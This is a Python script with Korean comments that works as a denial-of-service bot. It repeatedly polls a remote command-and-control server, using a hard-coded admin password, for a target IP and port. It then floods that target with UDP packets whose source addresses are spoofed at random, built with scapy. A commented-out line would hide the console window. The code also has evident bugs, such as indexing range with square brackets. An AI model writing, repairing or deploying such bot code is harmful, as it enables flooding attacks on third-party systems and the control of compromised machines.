import requests
import ctypes
import time
import threading
from scapy.all import IP, UDP, send
import random
#ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)


def random_ip():
    # 각 옥텟을 0~255 범위에서 랜덤하게 생성
    return '.'.join(str(random.randint(0, 255)) for _ in range(4))
    
def perform_dos(target_ip, target_port):
    print(f"Starting DoS attack on {target_ip}:{target_port}")
    packet_count = 0
    for num in range[15000]:
        # 랜덤 소스 IP 생성
        src_ip = random_ip()
        # UDP 패킷 생성
        packet = IP(src=src_ip, dst=target_ip) / UDP(sport=random.randint(1, 65535), dport=target_port) / ("X" * random.randint(10, 100))
        send(packet, verbose=False)
        packet_count += 1
        if packet_count % 100 == 0:
            print(f"Sent {packet_count} packets to {target_ip}:{target_port}")
            
            
url = "http://smell.kro.kr:5000/objects"
password = "MIICWgIBAAKBgFlFkeP2FFDGIbzyCK7YAmtl/xOsFN8+mm8Hk8XJfMo2ZMEaJvjrdusvHARo4oIU1OxtxNasU41MeSGg7xMurL6DRrEhB61qOKLydICyUX9w0dmS+r7kqTM9X4Ts+vwHBjBhIMYE8j7O5FUfSlVrCGUMFhEfxhvwehCO7Ijn8cgPAgMBAAEC"
while True:
    try:
        response = requests.get(url, auth=("admin", password))

            # 응답 상태 코드 확인 (200 OK)
        if response.status_code == 200:
            try:
                data = response.json()  # 서버 응답을 JSON으로 파싱
                ip = data.get("ip")
                port = data.get("port")

                if ip and port:  # ip와 port가 유효한지 확인
                    dos = perform_dos(ip, port)
                    thread = threading.Thread(target=dos)
                    thread.start()
                    thread.join()  # 스레드가 종료될 때까지 대기
                else:
                    print("Invalid IP or port data received.")
            except ValueError:
                print("Response is not in JSON format.")
        else:
            print(f"Request failed with status code: {response.status_code}")
        
    except Exception as e:
        pass
    time.sleep(20)  # 60초 대기